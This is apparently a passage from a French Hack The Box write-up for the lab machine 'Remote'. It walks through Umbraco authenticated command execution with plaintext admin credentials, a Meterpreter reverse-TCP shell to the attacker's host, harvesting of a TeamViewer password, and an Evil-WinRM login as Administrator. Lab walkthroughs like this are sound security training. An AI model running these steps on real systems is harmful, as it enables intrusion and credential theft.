-a----        2/19/2020   3:11 PM          21504 validcfg.dll                                                          
-a----        2/19/2020   3:11 PM         146250 w3core.mof                                                            
-a----        2/19/2020   3:11 PM          16384 w3ctrlps.dll                                                          
-a----        2/19/2020   3:11 PM          29696 w3ctrs.dll                                                            
-a----        2/19/2020   3:11 PM         109568 w3dt.dll                                                              
-a----        2/19/2020   3:11 PM           2560 w3isapi.mof                                                           
-a----        2/19/2020   3:11 PM         101888 w3logsvc.dll                                                          
-a----        2/19/2020   3:11 PM          29184 w3tp.dll                                                              
-a----        2/19/2020   3:11 PM          26624 w3wp.exe                                                              
-a----        2/19/2020   3:11 PM          78336 w3wphost.dll                                                          
-a----        2/19/2020   3:11 PM          39936 wamreg.dll                                                            
-a----        2/19/2020   3:11 PM          32256 warmup.dll                                                            
-a----        2/19/2020   3:11 PM          31744 wbhstipm.dll                                                          
-a----        2/19/2020   3:11 PM          27648 wbhst_pm.dll                                                          
-a----        2/19/2020   3:11 PM         189952 webdav.dll                                                            
-a----        2/19/2020   3:11 PM          23552 webdav_simple_lock.dll                                                
-a----        2/19/2020   3:11 PM          20480 webdav_simple_prop.dll                                                
-a----        2/19/2020   3:11 PM         169984 XPath.dll                                                             



root@Host-001:~/Bureau/htb/Remote# 
~~~

On upload payload.exe apres s'etre connecté à Umbraco en utilisant admin@htb.local:baconandcheese  http://10.10.10.180/umbraco/#/media

~~~
root@Host-001:~/Bureau/htb/Remote# python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'ls C:/'


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/20/2020   1:13 AM                ftp_transfer                                                          
d-----        2/19/2020   3:11 PM                inetpub                                                               
d-----        2/19/2020  11:09 PM                Microsoft                                                             
d-----        9/15/2018   3:19 AM                PerfLogs                                                              
d-r---        2/23/2020   2:19 PM                Program Files                                                         
d-----        2/23/2020   2:19 PM                Program Files (x86)                                                   
d-----        7/31/2020  11:58 AM                site_backups                                                          
d-----        7/31/2020   6:20 PM                temp                                                                  
d-r---        2/19/2020   3:12 PM                Users                                                                 
d-----        2/20/2020  12:52 AM                Windows                                                               
root@Host-001:~/Bureau/htb/Remote# python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'ls C:/inetpub'


    Directory: C:\inetpub


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/19/2020   3:11 PM                custerr                                                               
d-----        2/19/2020   3:11 PM                ftproot                                                               
d-----        2/20/2020   1:33 AM                history                                                               
d-----        2/19/2020   4:36 PM                logs                                                                  
d-----        2/19/2020   3:11 PM                temp                                                                  
d-----        2/20/2020  12:16 PM                wwwroot                                                               

root@Host-001:~/Bureau/htb/Remote# python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'ls C:/inetpub/wwwroot'


    Directory: C:\inetpub\wwwroot


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/19/2020   6:02 PM                App_Browsers                                                          
d-----        2/20/2020   1:59 AM                App_Data                                                              
d-----        2/19/2020  10:29 PM                App_Plugins                                                           
d-----        2/19/2020   3:12 PM                aspnet_client                                                         
d-----        2/19/2020  11:30 PM                bin                                                                   
d-----        2/19/2020   6:02 PM                Config                                                                
d-----        2/19/2020  10:29 PM                css                                                                   
d-----        7/31/2020   8:12 PM                Media                                                                 
d-----        2/19/2020  10:29 PM                scripts                                                               
d-----        2/19/2020   6:02 PM                Umbraco                                                               
d-----        2/19/2020   6:02 PM                Umbraco_Client                                                        
d-----        2/19/2020  10:29 PM                Views                                                                 
-a----        11/1/2018   1:06 PM            152 default.aspx                                                          
-a----        11/1/2018   1:06 PM             89 Global.asax                                                           
-a----        2/20/2020  12:57 AM          28539 Web.config                                                            



root@Host-001:~/Bureau/htb/Remote# python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'ls C:/inetpub/wwwroot/Media'


    Directory: C:\inetpub\wwwroot\Media


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/19/2020  10:29 PM                1001                                                                  
d-----        2/19/2020  10:29 PM                1002                                                                  
d-----        2/19/2020  10:29 PM                1003                                                                  
d-----        2/19/2020  10:29 PM                1004                                                                  
d-----        2/19/2020  10:29 PM                1005                                                                  
d-----        2/19/2020  10:29 PM                1006                                                                  
d-----        2/19/2020  10:29 PM                1010                                                                  
d-----        2/19/2020  10:29 PM                1011                                                                  
d-----        2/19/2020  10:29 PM                1012                                                                  
d-----        2/19/2020  10:29 PM                1013                                                                  
d-----        2/19/2020  10:29 PM                1014                                                                  
d-----        2/19/2020  10:29 PM                1015                                                                  
d-----        2/19/2020  10:29 PM                1016                                                                  
d-----        2/19/2020  10:29 PM                1030                                                                  
d-----        2/19/2020  11:34 PM                1031                                                                  
d-----        2/20/2020   1:55 AM                1032                                                                  
d-----        7/31/2020   8:02 PM                1033                                                                  
d-----        7/31/2020   8:03 PM                1034                                                                  
d-----        7/31/2020   8:12 PM                1035                                                                  
d-----         8/1/2020   4:02 AM                1036                                                                  
-a----        11/1/2018   1:06 PM            339 Web.config                                                            



root@Host-001:~/Bureau/htb/Remote# python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'ls C:/inetpub/wwwroot/Media/1036'


    Directory: C:\inetpub\wwwroot\Media\1036


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         8/1/2020   4:02 AM          73802 payload.exe                                                           



root@Host-001:~/Bureau/htb/Remote# 
~~~

Lancer un meterpreter:

~~~
root@Host-001:~/Bureau/htb/Remote# msfconsole
                                                  

 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|


       =[ metasploit v5.0.99-dev                          ]
+ -- --=[ 2046 exploits - 1106 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it with setg RHOSTS x.x.x.x

msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf5 exploit(multi/handler) > set lport 1234
lport => 1234
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.53:1234 
~~~

~~~
root@Host-001:~/Bureau/htb/Remote# python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'C:/inetpub/wwwroot/Media/1036/payload.exe'
~~~

On a un shell 

~~~
[*] Started reverse TCP handler on 10.10.14.53:1234 
[*] Sending stage (176195 bytes) to 10.10.10.180
[*] Meterpreter session 1 opened (10.10.14.53:1234 -> 10.10.10.180:50058) at 2020-08-01 10:07:08 +0200

meterpreter > 
~~~

On va utiliser winpeas [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe)

~~~
root@Host-001:~/Téléchargements# cp winPEAS.exe /root/Bureau/htb/Remote/
root@Host-001:~/Téléchargements# cd /root/Bureau/htb/Remote/
root@Host-001:~/Bureau/htb/Remote# ls
exploit.py  payload.exe  winPEAS.exe
root@Host-001:~/Bureau/htb/Remote# 
~~~

On upload winPeas via l'interface d'Umbraco comme pr le payload

On lance winPEAS et on a confirmation que teamviewer est en marche

Ref: [https://www.rapid7.com/db/modules/post/windows/gather/credentials/teamviewer_passwords](https://www.rapid7.com/db/modules/post/windows/gather/credentials/teamviewer_passwords)

~~~
C:\inetpub\wwwroot\Media\1038>exit
exit
meterpreter > run post/windows/gather/credentials/teamviewer_passwords 

[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
[+] Passwords stored in: /root/.msf4/loot/20200801103559_default_10.10.10.180_host.teamviewer__856592.txt
[*] <---------------- | Using Window Technique | ---------------->
[*] TeamViewer's language setting options are ''
[*] TeamViewer's version is ''
[-] Unable to find TeamViewer's process
meterpreter >
~~~
~~~
root@Host-001:~/Bureau/htb/Remote# evil-winrm -u Administrator -p '!R3m0te!' -i 10.10.10.180

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:/
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/20/2020   1:13 AM                ftp_transfer
d-----        2/19/2020   3:11 PM                inetpub
d-----        2/19/2020  11:09 PM                Microsoft
d-----        9/15/2018   3:19 AM                PerfLogs
d-r---        2/23/2020   2:19 PM                Program Files
d-----        2/23/2020   2:19 PM                Program Files (x86)
d-----        7/31/2020  11:58 AM                site_backups
d-----        7/31/2020   6:20 PM                temp
d-r---        2/19/2020   3:12 PM                Users
d-----        2/20/2020  12:52 AM                Windows


*Evil-WinRM* PS C:\> cd Users
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/19/2020   3:12 PM                .NET v2.0
d-----        2/19/2020   3:12 PM                .NET v2.0 Classic
d-----        2/19/2020   3:12 PM                .NET v4.5
d-----        2/19/2020   3:12 PM                .NET v4.5 Classic
d-----        7/31/2020  12:58 PM                Administrator
d-----        2/19/2020   3:12 PM                Classic .NET AppPool
d-r---         8/1/2020  12:54 AM                Public


*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        2/19/2020   3:03 PM                3D Objects
d-r---        2/19/2020   3:03 PM                Contacts
d-r---        2/20/2020   2:41 AM                Desktop
d-r---        2/19/2020   4:26 PM                Documents
d-r---        2/23/2020   1:22 PM                Downloads
d-r---        2/19/2020   3:03 PM                Favorites
d-r---        2/19/2020   3:03 PM                Links
d-r---        2/19/2020   3:03 PM                Music
d-r---        2/19/2020   3:03 PM                Pictures
d-r---        2/19/2020   3:03 PM                Saved Games
d-r---        2/20/2020  12:45 AM                Searches
d-r---        2/19/2020   3:03 PM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/31/2020  12:58 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
9738f22c2831928aaa828b3a9a4648b9
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 

~~~

**Poursuivez avec :** 

[- Oneliner Shells](https://0xss0rz.github.io/2020-05-10-Oneliner-shells/)

[- HTB - Write Up Machine](https://0xss0rz.github.io/2020-08-04-HTB-Write-Up/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
